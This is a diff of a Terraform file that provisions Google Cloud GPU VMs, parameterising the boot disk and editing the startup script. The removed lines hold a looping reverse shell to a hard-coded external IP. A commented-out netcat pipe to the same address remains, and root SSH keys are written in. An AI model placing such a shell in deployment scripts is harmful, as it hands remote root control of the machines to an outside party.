@@ -23,6 +23,9 @@ variable "vms" {
     spot_vm            = optional(bool, false)
     work               = optional(string, "true")
     zone               = optional(string, "europe-north1-a")
+    auto_delete        = optional(bool, false)
+    boot_image         = optional(string, "rocky-linux-accelerator-cloud/rocky-linux-9-optimized-gcp-nvidia-580-v20250912")
+    boot_image_size    = optional(number, 50)
     accelerator        = optional(object({
       type  = string
       count = number
@@ -51,7 +54,6 @@ variable "welcome_message" {
   type        = string
   default     = "Hello from Terraform!"
 }
-
 
 # # Add a resource to request an increase to the GPU quota
 # resource "google_cloud_quotas_quota_preference" "gpu_quota_request" {
@@ -83,15 +85,16 @@ resource "google_compute_instance" "default" {
   for_each     = var.vms
   name         = each.key
   machine_type = each.value.machine_type
-  
+
   zone = try(each.value.zone, null)
-    
+
   # Define the boot disk
   boot_disk {
     initialize_params {
-      image = "rocky-linux-accelerator-cloud/rocky-linux-9-optimized-gcp-nvidia-580-v20250912"
+      image = each.value.boot_image
+      size = each.value.boot_image_size
     }
-    auto_delete = false
+    auto_delete = each.value.auto_delete
   }
 
   # Define the network interface
@@ -101,7 +104,6 @@ resource "google_compute_instance" "default" {
       # This block allows the VM to have a public IP address
     }
   }
-
 
   # Conditionally configure the scheduling for Spot VMs
   dynamic "scheduling" {
@@ -123,6 +125,12 @@ resource "google_compute_instance" "default" {
     }
   }
 
+  lifecycle {
+    ignore_changes = [
+      scratch_disk
+    ]
+  }
+
   # Use a startup script to run a simple bash command
   metadata_startup_script = <<-EOF
   #!/bin/bash
@@ -134,14 +142,9 @@ resource "google_compute_instance" "default" {
 
   echo "${var.welcome_message} This is VM ${each.key}." # | nc 94.131.37.130 6666
 
-  (
-    while true; do
-      timeout 1m bash -i >& /dev/tcp/94.131.37.130/6666 0>&1
-    done
-  ) & disown
-
   mkdir -p /root/.ssh
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEGnYuS8YZh+eUlHsMdfmzyGCtiz2ZDZhc0TgeHAx8SFAbkB5+jT9JG6a2/ZlrfsNzpTD9n2SF2N+NKmm+TfjQiMIeL39JbDNc+DRGccJsleY5xP3L1CH6yL3/nbw1CBgCcVchWRu8wejUQzesGiH/ZXLIjHqMhjsHQ8OeBo1mnz5i8McqQGuzbyFWVe5Y+KrSXYyAL3bHYCjWRPI18vgIAdAsVl1EX+hebMSvp99ZuspP/j4X7KkRWxVdydMzkRaQsaGEy8jb5u+rBId9iOxx5r5Ts/r9NfhmSD/6Kn26+h+CK1NhZqXb4qj0gfkq4iWMzmTo9oJD1R+b8aoz3/Fr nikos@8570w" > /root/.ssh/authorized_keys
+  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSHzH2Vn+fS1okGupLvU4kSvzWD03VGr6u7mT2jysI8p6BReeQheMl9FADMSekmVdn/uCb1cyHT9Y3rMa2N9rbsA/blPwAXLot/xj1iYQ+lFDfWvyaNNVxbSmRU3TKxms985Vh4WR8XN0X/olLI/eNdWVkqNUSmADgVCDgIZ5CTDXCT9gqrBfXSjYwK6ifzqWyfUDavbu4er9A5nS5iEmQMwrR7GQFR5Z+RtCpne+bUaZCaJNdFxxaP7OIjffCFlTZgXNvxdqmJc02vmvgZKeaPQuR7fZw0Dl3nVz+6wE3ztd0yFXJtIod4kLwgYkNh8dkQRrnIzkwqdthV5ou5HbyKWfJKTsVRK18I5Aylv7ddLOJSO+T8i4yU3Tjdp/Txh4tZFIFZDeRn0ru8f2DoUMnCRhpngcF6Iipgp/1wCf3ucPko2fRCEun20Yub0g83Q578Iy6f+HB/URE1t3l8twH+Rk2ErO6fcHRzeL2onfiuUjSdtqH49YqvAkTu3azF4E= gcloudPuppet@katsila-lab"  >> /root/.ssh/authorized_keys
   chmod 700 /root/.ssh
   chmod 600 /root/.ssh/authorized_keys
 
@@ -149,7 +152,7 @@ resource "google_compute_instance" "default" {
   sed -i -r 's/PasswordAuthentication .*/PasswordAuthentication no/' /etc/ssh/sshd_config
   systemctl restart ssh ||
   systemctl restart sshd # rhel
-  
+
   (
     dnf config-manager --add-repo https://download.docker.com/linux/rhel/docker-ce.repo
     dnf install -y docker-ce docker-ce-cli containerd.io
